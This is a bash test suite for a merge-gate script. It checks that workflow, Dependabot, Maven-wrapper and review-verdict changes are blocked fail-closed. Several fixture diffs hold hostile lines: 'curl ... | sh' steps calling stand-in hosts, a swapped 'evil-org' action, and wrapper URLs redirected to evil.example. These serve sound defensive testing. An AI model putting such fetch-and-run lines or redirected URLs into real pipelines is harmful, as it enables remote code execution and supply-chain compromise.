expect_exit 1 "AC3: a commits API error fails closed" -- gate --dry-run 7
PRFILES=$(jq -nc --arg p $'@@ -30,2 +30,3 @@\n       - uses: actions/checkout@'"$SHA_A"$'\n+      - run: curl -s https://example.invalid/x | sh\n       - run: pnpm install' '[{filename:".github/workflows/web.yml",status:"modified",patch:$p}]')
dep '[{"path":".github/workflows/web.yml"}]'
expect_exit 1 "AC3: a workflow edit that is not a uses: bump blocks" -- gate --dry-run 7
expect_output_contains "only 'uses: <action>@<sha>' SHA bumps may change" "explains the workflow rule"
PRFILES=$(jq -nc --arg p $'@@ -20,1 +20,1 @@\n-      - uses: actions/checkout@'"$SHA_A"$'\n+      - uses: evil-org/checkout@'"$SHA_B" '[{filename:".github/workflows/web.yml",status:"modified",patch:$p}]')
dep '[{"path":".github/workflows/web.yml"}]'
expect_exit 1 "AC3: a uses: line that swaps the action (not a bump) blocks" -- gate --dry-run 7
expect_output_contains "a bump keeps the line up to '@'" "explains the same-action rule"
PRFILES=$(jq -nc --arg p $'@@ -20,1 +20,1 @@\n-      - uses: actions/checkout@'"$SHA_A"$'\n+      - uses: actions/checkout@v7' '[{filename:".github/workflows/web.yml",status:"modified",patch:$p}]')
dep '[{"path":".github/workflows/web.yml"}]'
expect_exit 1 "AC3: a uses: bump to a tag instead of a 40-hex SHA blocks" -- gate --dry-run 7
PRFILES=$(jq -nc --arg p $'@@ -19,2 +19,2 @@\n-      - uses: actions/checkout@'"$SHA_A"$'\n+      - uses: actions/checkout@'"$SHA_B"$'\n-        with: { fetch-depth: 1 }\n+        with: { fetch-depth: 0 }' '[{filename:".github/workflows/web.yml",status:"modified",patch:$p}]')
dep '[{"path":".github/workflows/web.yml"}]'
expect_exit 1 "AC3: a uses: bump bundled with a with: change blocks" -- gate --dry-run 7
PRFILES=$(jq -nc --arg p $'@@ -0,0 +1,1 @@\n+      - uses: actions/checkout@'"$SHA_B" '[{filename:".github/workflows/new.yml",status:"added",patch:$p}]')
dep '[{"path":".github/workflows/new.yml"}]'
expect_exit 1 "AC3: adding a workflow file blocks" -- gate --dry-run 7
PRFILES='[{"filename":".github/workflows/web.yml","status":"modified"}]'
dep '[{"path":".github/workflows/web.yml"}]'
expect_exit 1 "AC3: a workflow change without a diff to verify fails closed" -- gate --dry-run 7
PRFILES='[{"filename":".github/workflows/web.yml","status":"renamed","previous_filename":"scripts/x.sh","patch":""}]'
dep '[{"path":".github/workflows/web.yml"}]'
expect_exit 1 "AC3: renaming a file into an allowed path blocks" -- gate --dry-run 7
# T-M1.12: a realistic wrapper diff (the placeholder "-a/+b" patch no longer passes the OQ-17 content check; same intent, not a weaker test)
PRFILES=$(wrapper_files "$WRAPPER_BUMP")
dep '[{"path":"backend/.mvn/wrapper/maven-wrapper.properties"},{"path":"backend/pom.xml"}]'
expect_exit 0 "AC3/R3-3: a Maven wrapper properties bump passes" -- gate --dry-run 7
dep '[{"path":".mvn/extensions.xml"}]'
expect_exit 1 "AC3: other .mvn files (e.g. extensions.xml) are no longer allowed" -- gate --dry-run 7
dep '[{"path":"backend/.mvn/wrapper/maven-wrapper.jar"}]'
expect_exit 1 "AC3: the wrapper jar is not allowed" -- gate --dry-run 7
PRFILES='[{"filename":"backend/pom.xml","status":"modified","patch":"x"},{"filename":"scripts/merge-gate.sh","status":"modified","patch":"x"}]'
dep '[{"path":"backend/pom.xml"}]'
expect_exit 1 "AC3: the file list is taken from the files API, not only from pr view" -- gate --dry-run 7
expect_output_contains "outside the allow-list" "names the allow-list"

# ---- T-M1.7 review round 1 (DOCS-REVIEW findings) ----
wf() { PRFILES=$(jq -nc --arg p "$1" '[{filename:".github/workflows/docs-check.yml",status:"modified",patch:$p}]'); dep '[{"path":".github/workflows/docs-check.yml"}]'; }
SHA_P=5fda3b95a4ea91299a34e894583c3862153e4b97
wf $'@@ -20,6 +20,6 @@ jobs:\n     steps:\n-      - uses: actions/checkout@'"$SHA_A"$' # v7.0.1\n+      - uses: actions/setup-python@'"$SHA_P"$' # v7.0.0\n         with:\n           persist-credentials: false\n-      - uses: actions/setup-python@'"$SHA_P"$' # v7.0.0\n+      - uses: actions/checkout@'"$SHA_A"$' # v7.0.1\n         with:'
expect_exit 1 "S2-1: swapping two uses: lines (no SHA change) blocks" -- gate --dry-run 7
wf $'@@ -20,1 +20,1 @@\n-      - uses: actions/checkout@'"$SHA_A"$'\n+    uses: actions/checkout@'"$SHA_B"
expect_exit 1 "S2-1: re-indenting a uses: line blocks" -- gate --dry-run 7
wf $'@@ -20,1 +20,1 @@\n-      - uses: actions/checkout@'"$SHA_A"$' # v7.0.1\n+      - uses: actions/checkout@'"$SHA_A"$' # v7.0.2'
expect_exit 1 "S2-1: a uses: line that keeps its SHA is not a bump" -- gate --dry-run 7
expect_output_contains "keeps its SHA" "explains the same-SHA refusal"
wf $'@@ -20,4 +20,4 @@\n-      - uses: actions/checkout@'"$SHA_A"$'\n       - run: |\n           echo x\n+          uses: actions/checkout@'"$SHA_B"
expect_exit 1 "S2-1: moving a uses: line into a run: block blocks" -- gate --dry-run 7
wf $'@@ -20,2 +20,2 @@\n-      - uses: actions/checkout@'"$SHA_A"$' # v7.0.1\n-      - uses: actions/setup-node@'"$SHA_P"$'\n+      - uses: actions/checkout@'"$SHA_B"$' # v7.0.2\n+      - uses: actions/setup-node@'"$SHA_A"
expect_exit 0 "S2-1: two adjacent pairwise SHA bumps pass" -- gate --dry-run 7
PRFILES='[{"filename":"evil/pom.xml","status":"added","patch":"x"},{"filename":"backend/pom.xml","status":"removed","patch":"x"}]'
dep '[{"path":"backend/pom.xml"}]'
expect_exit 1 "S3-4: adding or removing manifests on a Dependabot PR blocks" -- gate --dry-run 7
expect_output_contains "may only modify existing files" "explains the modified-only rule"
for neg in 'QA-VERDICT  T-M9.9: FAIL' 'qa-verdict T-M9.9: FAIL' 'QA-VERDICT T-M9.9 : FAIL' '**QA-VERDICT T-M9.9: FAIL**' '`QA-VERDICT T-M9.9: FAIL`' '> QA-VERDICT T-M9.9: FAIL' 'ux-review t-m9.9: changes requested'; do
  write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')" "$(c "$neg")")" "$FILES" "$OK_CHECKS" 0
  expect_exit 1 "S3-1: a non-exact negative verdict blocks: '$neg'" -- gate --dry-run 7
done
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.90: FAIL')" "$(c '**qa-verdict T-M9.9: pass**')")" "$FILES" "$OK_CHECKS" 0
expect_exit 0 "S3-1: a negative for another id does not block, and a sloppy positive is simply ignored" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c '**QA-VERDICT T-M9.9: FAIL**')" "$(c 'QA-VERDICT T-M9.9: PASS')" "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
expect_exit 0 "S3-1: an exact PASS after a non-exact FAIL wins (latest within the type)" -- gate --dry-run 7
ACTIVITY=$(jq -n --arg t "$LATE" '[{activity_type:"push",after:"abc1234def5678",timestamp:$t,actor:{login:"x"}}]')
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "S3-2: a push recorded in the repository activity after the verdict makes it stale (even without a new run)" -- gate --dry-run 7
ACTIVITY='[{"activity_type":"push","after":"0000000","timestamp":"2026-09-25T09:00:00Z","actor":{"login":"x"}}]'
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "S3-2: no activity entry for the head fails closed" -- gate --dry-run 7
expect_output_contains "no push of it to 'chore/T-M9.9-x' in the repository activity" "explains the activity refusal"
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0; touch "$MOCK_DIR/activity.json.fail"
expect_exit 1 "S3-2: an activity API error fails closed" -- gate --dry-run 7
ACTIVITY='{"message":"Not Found"}'
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "S3-2: an activity answer that is not a list fails closed" -- gate --dry-run 7
ACTIVITY=$(jq -n --arg t "$HEAD_TIME" '[{activity_type:"branch_creation",after:"1111",timestamp:"2026-09-25T08:00:00Z",actor:{login:"dependabot[bot]"}},
  {activity_type:"push",after:"abc1234def5678",timestamp:$t,actor:{login:"duochou042004"}}]')
dep '[{"path":"backend/pom.xml"}]'
expect_exit 1 "S3-3: a push by a human to a Dependabot branch (per the repository activity) blocks" -- gate --dry-run 7
expect_output_contains "activity not by Dependabot: push by duochou042004" "names the foreign push"
ACTIVITY=$(jq -n --arg t "$HEAD_TIME" '[{activity_type:"branch_creation",after:"1",timestamp:"2026-09-24T08:00:00Z",actor:{login:"duochou042004"}},
  {activity_type:"branch_deletion",after:"0",timestamp:"2026-09-24T09:00:00Z",actor:{login:"duochou042004"}},
  {activity_type:"branch_creation",after:"abc1234def5678",timestamp:$t,actor:{login:"dependabot[bot]"}}]')
dep '[{"path":"backend/pom.xml"}]'
expect_exit 0 "S3-3: activity before Dependabot (re)created the branch does not count" -- gate --dry-run 7
ACTIVITY=$(jq -n --arg t "$HEAD_TIME" '[{activity_type:"push",after:"abc1234def5678",timestamp:$t,actor:{login:"dependabot[bot]"}}]')
dep '[{"path":"backend/pom.xml"}]'
expect_exit 1 "S3-3: a Dependabot branch without a recorded creation fails closed" -- gate --dry-run 7
RUNS=$(run_at chore/T-M9.9-x "2026-09-25T10:05:00.500Z")
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS' "$AFTER")" "$(c 'LC-APPROVED T-M9.9' "$AFTER")")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "S4-1: a run at 10:05:00.500Z makes a 10:05:00Z verdict stale (no string-order trick)" -- gate --dry-run 7
RUNS=$(run_at chore/T-M9.9-x "2026-09-25T10:00:00+00:00")
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "S4-1: an unparsable (non-Z) run time fails closed" -- gate --dry-run 7

# ---- T-M1.7 review round 2 ----
for opt in -n -e -E -ne; do
  wf "@@ -20,1 +20,1 @@"$'\n'"$opt"$'\n+      - run: curl https://evil.invalid | sh'
  expect_exit 1 "R2 S3-A: a removed line '$opt' (an echo option) cannot hide a non-bump" -- gate --dry-run 7
done
wf $'@@ -20,1 +20,1 @@\n-      - uses: actions/checkout@'"$SHA_A"$'\n+      - uses: actions/checkout@'"$SHA_B"$'\n\tsomething'
expect_exit 1 "R2 S4-A: a diff line with an unknown prefix fails closed" -- gate --dry-run 7
expect_output_contains "an unexpected diff line" "explains the unknown-prefix refusal"
ACTIVITY=$(jq -n --arg t "$HEAD_TIME" '[{activity_type:"push",after:"abc1234def5678",timestamp:$t,actor:{login:"duochou042004"}},
  {activity_type:"branch_creation",after:"1111",timestamp:$t,actor:{login:"dependabot[bot]"}}]')
dep '[{"path":"backend/pom.xml"}]'
expect_exit 1 "R2 S3-B: a human push in the same second as Dependabot's branch creation still counts" -- gate --dry-run 7
ACTIVITY=$(jq -n --arg t "$HEAD_TIME" '[{activity_type:"branch_creation",after:"abc1234def5678",timestamp:$t,actor:{login:"dependabot[bot]"}},
  {activity_type:"push",after:"1111",timestamp:"not-a-time",actor:{login:"duochou042004"}}]')
dep '[{"path":"backend/pom.xml"}]'
expect_exit 1 "R2 S3-B: an activity entry with an unparsable time counts as inside the window" -- gate --dry-run 7
for neg in '## QA-VERDICT T-M9.9: FAIL' '- QA-VERDICT T-M9.9: FAIL' '❌ QA-VERDICT T-M9.9: FAIL' 'QA-VERDICT T-M9.9 - FAIL' 'QA VERDICT T-M9.9: FAIL' 'DOCS-REVIEW T-M9.9: CHANGES_REQUESTED' 'SEC-REVIEW T-M9.9: CHANGES-REQUESTED'; do
  write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'QA-VERDICT T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')" "$(c "$neg")")" "$FILES" "$OK_CHECKS" 0
  expect_exit 1 "R2 S4-B: a non-exact negative verdict blocks: '$neg'" -- gate --dry-run 7
done
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.9-x: FAIL')" "$(c 'Notes: the earlier QA-VERDICT T-M9.9: FAIL is superseded')")" "$FILES" "$OK_CHECKS" 0
expect_exit 0 "R2 S4-B: another id with a '-' suffix and prose mentioning a verdict do not block" -- gate --dry-run 7

# ---- T-M1.12 AC1 (T-M1.7 R3 S4-1): only the id-suffix false refusal goes; every real negative word still blocks ----
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.9-FAILOVER: PASS')")" "$FILES" "$OK_CHECKS" 0
expect_exit 0 "T-M1.12 AC1: 'QA-VERDICT <id>-FAILOVER: PASS' is not a negative" -- gate --dry-run 7
for t in QA-VERDICT DOCS-REVIEW SEC-REVIEW UX-REVIEW; do
  for neg in "$t T-M9.9: FAIL" "$t T-M9.9: FAIL." "$t T-M9.9: FAIL (see F1)" "$t T-M9.9: CHANGES REQUESTED" "**$t T-M9.9: FAILED**" "$t T-M9.9 - FAILS AC3" \
             "$t T-M9.9: FAILED" "> ${t,,} T-M9.9: failed" "$t T-M9.9: FAILURE" "$t T-M9.9 - FAILING"; do
    write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')" "$(c "$neg")")" "$FILES" "$OK_CHECKS" 0
    expect_exit 1 "T-M1.12 AC1: '$neg' blocks" -- gate --dry-run 7
  done
done
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.9: FAILED-OVER')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "T-M1.12 AC1: an exact line with an unknown token (FAILED-OVER) still blocks" -- gate --dry-run 7

# ---- T-M1.12 AC2 (T-M1.7 R3 S4-2): rare loose negatives block; their positive twins never count ----
for form in '1. QA-VERDICT T-M9.9: %s' '1) QA-VERDICT T-M9.9: %s' '12. QA-VERDICT T-M9.9: %s' '- - QA-VERDICT T-M9.9: %s' '* QA-VERDICT T-M9.9: %s' '- * QA-VERDICT T-M9.9: %s' \
            'QA-VERDICT T-M9.9 — %s' 'QA-VERDICT T-M9.9 – %s' 'QA-VERDICT T-M9.9—%s' 'QA-VERDICT: T-M9.9: %s' '1.  QA-VERDICT:  T-M9.9 —  %s'; do
  printf -v neg -- "$form" FAIL
  write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')" "$(c "$neg")")" "$FILES" "$OK_CHECKS" 0
  expect_exit 1 "T-M1.12 AC2: '$neg' blocks" -- gate --dry-run 7
  printf -v pos -- "$form" PASS
  write_fixture feature/T-M9.9-x develop CLEAN "$(cs "$(c "$pos")" "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
  expect_exit 1 "T-M1.12 AC2: '$pos' is not a positive QA verdict" -- gate --dry-run 7
  expect_output_contains "needs a fresh 'QA-VERDICT T-M9.9: PASS' (latest: 'none')" "the twin is ignored, not read as a verdict"
done
for pos in 'DOCS-REVIEW: T-M9.9: PASS' '1. DOCS-REVIEW T-M9.9: PASS'; do
  write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c "$pos")" "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
  expect_exit 1 "T-M1.12 AC2: '$pos' is not a positive docs verdict" -- gate --dry-run 7
done

# ---- T-M1.12 review F1/F2: loose words after a separator still block; Unicode spaces, colons, dashes and more list markers are normalised ----
for neg in '**QA-VERDICT T-M9.9: FAILURES**' 'QA-VERDICT T-M9.9 - FAILINGS' 'QA-VERDICT T-M9.9: FAIL2' 'QA-VERDICT T-M9.9 -FAILSAFE' 'QA-VERDICT T-M9.9-FAILED' 'QA-VERDICT T-M9.9—FAIL'            $'SEC-REVIEW T-M9.9: CHANGES REQUESTED' $'QA-VERDICT T-M9.9: FAIL' $'QA-VERDICT T-M9.9： FAIL' $'QA-VERDICT T-M9.9 － FAIL' $'QA-VERDICT　T-M9.9: FAIL'            '+ QA-VERDICT T-M9.9: FAIL' '- [x] QA-VERDICT T-M9.9: FAIL' '(1) QA-VERDICT T-M9.9: FAIL' 'QA-VERDICT T-M9.9:: CHANGES REQUESTED' \
           'QA-VERDICT T-M9.9- FAIL' '**QA-VERDICT T-M9.9- CHANGES REQUESTED**' 'QA-VERDICT T-M9.9-: FAIL' 'QA-VERDICT T-M9.9-  FAILED' 'QA-VERDICT T-M9.9 : - FAIL' \
           'QA-VERDICT T-M9.9 - - FAIL' 'QA-VERDICT T-M9.9-FAILURES' 'QA-VERDICT T-M9.9--FAILINGS'; do
  write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')" "$(c "$neg")")" "$FILES" "$OK_CHECKS" 0
  expect_exit 1 "T-M1.12 review F1/F2: '$neg' blocks" -- gate --dry-run 7
done
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.9-FAILOVER: PASS')" "$(c 'UX-REVIEW T-M9.9-FAILSAFE: APPROVED')")" "$FILES" "$OK_CHECKS" 0
expect_exit 0 "T-M1.12 review F1: a word glued to the id by a dash (FAILOVER, FAILSAFE) is not a negative" -- gate --dry-run 7

# ---- T-M1.12 AC3 (OQ-17 = yes, DEC-075): the Maven wrapper properties may only get version bumps ----
PRFILES=$(wrapper_files $'@@ -1,3 +1,3 @@\n-wrapperVersion=3.3.4\n+wrapperVersion=3.3.5\n distributionType=only-script\n distributionUrl=x')
dep '[{"path":"backend/.mvn/wrapper/maven-wrapper.properties"}]'
expect_exit 0 "T-M1.12 AC3: a wrapperVersion-only bump passes" -- gate --dry-run 7
bad_wrapper() { # <description> <patch> <expected message part>
  PRFILES=$(wrapper_files "$2"); dep '[{"path":"backend/.mvn/wrapper/maven-wrapper.properties"}]'
  expect_exit 1 "T-M1.12 AC3: $1 fails" -- gate --dry-run 7
  expect_output_contains "$3" "T-M1.12 AC3: $1 — names the line"
}
bad_wrapper "another host" $'@@ -3 +3 @@\n-distributionUrl='"$MVN_URL"$'/3.9.16/apache-maven-3.9.16-bin.zip\n+distributionUrl=https://evil.example/maven2/org/apache/maven/apache-maven/3.9.17/apache-maven-3.9.17-bin.zip' "evil.example"
bad_wrapper "userinfo in the URL" $'@@ -3 +3 @@\n-distributionUrl='"$MVN_URL"$'/3.9.16/apache-maven-3.9.16-bin.zip\n+distributionUrl=https://repo.maven.apache.org@evil.example/maven2/org/apache/maven/apache-maven/3.9.17/apache-maven-3.9.17-bin.zip' "@evil.example"
bad_wrapper "another path on the same host" $'@@ -3 +3 @@\n-distributionUrl='"$MVN_URL"$'/3.9.16/apache-maven-3.9.16-bin.zip\n+distributionUrl=https://repo.maven.apache.org/maven2/org/evil/apache-maven/3.9.17/apache-maven-3.9.17-bin.zip' "org/evil"
bad_wrapper "mismatched versions in the URL" $'@@ -3 +3 @@\n-distributionUrl='"$MVN_URL"$'/3.9.16/apache-maven-3.9.16-bin.zip\n+distributionUrl='"$MVN_URL"$'/3.9.17/apache-maven-3.9.18-bin.zip' "3.9.18-bin.zip"
bad_wrapper "a query string" $'@@ -3 +3 @@\n-distributionUrl='"$MVN_URL"$'/3.9.16/apache-maven-3.9.16-bin.zip\n+distributionUrl='"$MVN_URL"$'/3.9.17/apache-maven-3.9.17-bin.zip?x=1' "bin.zip?x="
bad_wrapper "an added key" $'@@ -3 +3,2 @@\n distributionUrl=x\n+distributionSha256Sum=abc' "adds 1"
bad_wrapper "a removed key" $'@@ -1,3 +1,2 @@\n wrapperVersion=3.3.4\n-distributionType=only-script\n distributionUrl=x' "removes 1"
bad_wrapper "a distributionType change" $'@@ -2 +2 @@\n-distributionType=only-script\n+distributionType=bin' "distributionType=bin"
bad_wrapper "a renamed key" $'@@ -1 +1 @@\n-wrapperVersion=3.3.4\n+wrapperVersionX=3.3.5' "wrapperVersionX"
bad_wrapper "a non-semver wrapperVersion" $'@@ -1 +1 @@\n-wrapperVersion=3.3.4\n+wrapperVersion=3.3.5;x' "3.3.5;x"
bad_wrapper "a fullwidth digit (any locale, review F3)" $'@@ -1 +1 @@\n-wrapperVersion=3.3.4\n+wrapperVersion=\uff13.3.5' "wrapperVersion="
bad_wrapper "a -n line (printf, not echo)" $'@@ -1 +1 @@\n-n\n+wrapperVersion=3.3.5' "became"
PRFILES='[{"filename":"backend/.mvn/wrapper/maven-wrapper.properties","status":"modified"}]'
dep '[{"path":"backend/.mvn/wrapper/maven-wrapper.properties"}]'
expect_exit 1 "T-M1.12 AC3: a wrapper change without a diff fails closed" -- gate --dry-run 7

# ---- T-M1.12 AC4 (DEC-074): strict arguments; --dry-run before or after the number; errors exit 2 with no gh call ----
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 0 "T-M1.12 AC4: '--dry-run 7' dry-runs" -- gate --dry-run 7
[[ ! -f "$MOCK_DIR/merged.txt" ]] && { PASS_COUNT=$((PASS_COUNT + 1)); echo "  ok   - T-M1.12 AC4: '--dry-run 7' made no merge call"; } || { FAIL_COUNT=$((FAIL_COUNT + 1)); echo "  FAIL - '--dry-run 7' merged"; }
expect_exit 0 "T-M1.12 AC4: '7 --dry-run' dry-runs" -- gate 7 --dry-run
[[ ! -f "$MOCK_DIR/merged.txt" ]] && { PASS_COUNT=$((PASS_COUNT + 1)); echo "  ok   - T-M1.12 AC4: '7 --dry-run' made no merge call"; } || { FAIL_COUNT=$((FAIL_COUNT + 1)); echo "  FAIL - '7 --dry-run' merged (DEC-074)"; }
for args in "" "--dry-run" "7 --dryrun" "7 21" "abc" "--force 7" "07" "7 --dry-run=1" "-- 7" $'\uff17' $'\u0667'; do
  rm -f "$MOCK_DIR/calls.txt"
  # shellcheck disable=SC2086
  expect_exit 2 "T-M1.12 AC4: arguments '$args' exit 2 (caller locale en_US.UTF-8)" -- env LC_ALL=en_US.UTF-8 "$ROOT/scripts/merge-gate.sh" $args
  expect_output_contains "usage: merge-gate.sh" "T-M1.12 AC4: '$args' prints the usage"
  [[ ! -s "$MOCK_DIR/calls.txt" ]] && { PASS_COUNT=$((PASS_COUNT + 1)); echo "  ok   - T-M1.12 AC4: '$args' made no gh call"; } \
    || { FAIL_COUNT=$((FAIL_COUNT + 1)); echo "  FAIL - T-M1.12 AC4: '$args' called gh: $(head -1 "$MOCK_DIR/calls.txt")"; }
done

# T-M2.23 AC5 (constraints 2, 9; attacks A-4, A-6): the gate recomputes text-only from the PR's files and wants a full run otherwise.
ALL_CHECKS=$(jq -c '. + [{"name":"container-build","bucket":"pass"}]' <<<"$OK_CHECKS")   # jobs 100..106; heavy: backend 102, web 103, contract-drift 104, e2e-smoke 105, container-build 106
PROD='[{"path":"progress.json"},{"path":"web/src/a.ts"}]'
prod() { write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$PROD" "$ALL_CHECKS" 0; }
text() { write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$ALL_CHECKS" 0; }
refused() { expect_exit 1 "T-M2.23: $1" -- gate --dry-run 7; expect_output_contains "$2" "T-M2.23: $1: says why"; }
prod
expect_exit 0 "T-M2.23: a product PR whose heavy checks all ran in full passes" -- gate --dry-run 7
expect_output_contains "merge-gate: scope full; checks: 5 full, 0 fast-path" "T-M2.23: the scope line counts the five heavy checks as full"
MARKER=skipped; prod
refused "a product PR with skipped markers" "check 'e2e-smoke' took the fast path (marker 'Full run on develop' skipped), but this PR is not text-only"
expect_output_contains "check 'container-build' took the fast path" "T-M2.23: the non-required heavy check needs a full run too"
expect_output_not_contains "check 'docs-check'" "T-M2.23: docs-check needs no marker"
expect_output_not_contains "check 'secrets-scan'" "T-M2.23: secrets-scan needs no marker"
prod; write_job 105 "Full run on develop" skipped
refused "one skipped marker among full runs" "check 'e2e-smoke' took the fast path"
prod; write_job 105 "Full run on feature/T-y" success
refused "a marker for another base (a run from before a retarget, A-4)" "check 'e2e-smoke' has no full run for head abc1234: no successful 'Full run on develop' step"
prod; write_job 103 "Typecheck" success
refused "a job without a marker step" "check 'web' has no full run"
prod; write_job 102 "Full run on develop" failure
refused "a failed marker" "check 'backend' has no full run"
prod; write_job 104 "Full run on develop" success 0000000aaaaaaa
refused "a job for another head SHA" "check 'contract-drift' has no full run"
prod; jq -c '.steps += [{name:"Full run on develop",conclusion:"success"}]' "$MOCK_DIR/job-103.json" >"$MOCK_DIR/t" && mv "$MOCK_DIR/t" "$MOCK_DIR/job-103.json"
refused "two steps named like the marker" "check 'web' has no full run"
prod; touch "$MOCK_DIR/job-105.json.fail"
refused "a jobs API error" "check 'e2e-smoke' has no full run"
prod; echo 'not json' >"$MOCK_DIR/job-105.json"
refused "a jobs API answer that is not JSON" "check 'e2e-smoke' has no full run"
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$PROD" "$(jq -c 'map(if .name == "web" then . + {link:"https://example.com/checks/9"} else . end)' <<<"$ALL_CHECKS")" 0
refused "a check whose link is not an Actions job" "check 'web' has no full run"
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$PROD" "$(jq -c 'map(if .name == "web" then . + {link:"https://github.com/o/r/actions/runs/1/job/105/x"} else . end)' <<<"$ALL_CHECKS")" 0
refused "a link with a trailing path" "check 'web' has no full run"
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$PROD" "$(jq -c '. + [{"name":"new-job","bucket":"pass","link":"https://github.com/o/r/actions/runs/1/job/999"}]' <<<"$ALL_CHECKS")" 0
refused "a new check without a marker (fail closed for future jobs)" "check 'new-job' has no full run"
MARKER=skipped; write_fixture dependabot/github_actions/actions-abc develop CLEAN "$(cs "$(c 'LC-APPROVED PR-7')")" '[{"path":".github/workflows/docs-check.yml"}]' "$ALL_CHECKS" 0 app/dependabot
refused "a Dependabot PR with skipped markers" "took the fast path"

# a text-only PR needs no marker; the markers are read only for the count
MARKER=skipped; text
expect_exit 0 "T-M2.23: a text-only PR with skipped markers passes" -- gate --dry-run 7
expect_output_contains "merge-gate: scope text-only; checks: 0 full, 5 fast-path" "T-M2.23: the scope line counts five fast-path checks (constraint 9)"
text
expect_exit 0 "T-M2.23: a text-only PR whose checks ran in full passes (shadow mode on a product-free PR)" -- gate --dry-run 7
expect_output_contains "merge-gate: scope text-only; checks: 5 full, 0 fast-path" "T-M2.23: the scope line counts five full checks"
MARKER=skipped; text; write_job 102 "Full run on develop" success
expect_exit 0 "T-M2.23: a text-only PR with mixed markers passes" -- gate --dry-run 7
expect_output_contains "checks: 1 full, 4 fast-path" "T-M2.23: a miscount would fail here (1 full, 4 fast-path)"
MARKER=skipped; text; touch "$MOCK_DIR/job-105.json.fail"
expect_exit 0 "T-M2.23: a text-only PR is not refused when a job cannot be read" -- gate --dry-run 7
expect_output_contains "merge-gate: scope text-only; checks: unknown" "T-M2.23: the count is 'unknown' then"

# what is NOT text-only: each PR below has skipped markers, so it is refused exactly when the gate does not call it text-only
REL=$(cs "$(c 'QA-VERDICT 1.0.0: PASS')" "$(c 'PO-APPROVED 1.0.0')" "$(c 'LC-APPROVED 1.0.0')")
MARKER=skipped; write_fixture release/1.0.0 master CLEAN "$REL" "$FILES" "$ALL_CHECKS" 0
refused "only text files but base master (G0 D-3)" "took the fast path (marker 'Full run on master' skipped)"
write_fixture release/1.0.0 master CLEAN "$REL" "$FILES" "$ALL_CHECKS" 0
expect_exit 0 "T-M2.23: the same release PR with full runs on master passes" -- gate --dry-run 7
expect_output_contains "merge-gate: scope full; checks: 5 full, 0 fast-path" "T-M2.23: a PR to master is never text-only"
nto() { # <description> <PRFILES (raw API pages)> <files json for changedFiles>
  MARKER=skipped; PRFILES=$2; write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$3" "$ALL_CHECKS" 0
  refused "not text-only: $1" "took the fast path"; }
P='{"filename":"progress.json","status":"modified"}'
nto "a file off the list" "[$P,{\"filename\":\"scripts/gate.sh\",\"status\":\"modified\"}]" "$FILES"
nto ".claude/settings.json" "[$P,{\"filename\":\".claude/settings.json\",\"status\":\"modified\"}]" "$FILES"
nto "a *.md below the root" "[$P,{\"filename\":\"web/README.md\",\"status\":\"modified\"}]" "$FILES"
nto "Docs/a.md (case)" "[$P,{\"filename\":\"Docs/a.md\",\"status\":\"added\"}]" "$FILES"
nto "a rename from a path off the list" "[$P,{\"filename\":\"docs/a.md\",\"status\":\"renamed\",\"previous_filename\":\"web/a.md\"}]" "$FILES"
nto "a rename to a path off the list" "[$P,{\"filename\":\"web/a.md\",\"status\":\"renamed\",\"previous_filename\":\"docs/a.md\"}]" "$FILES"
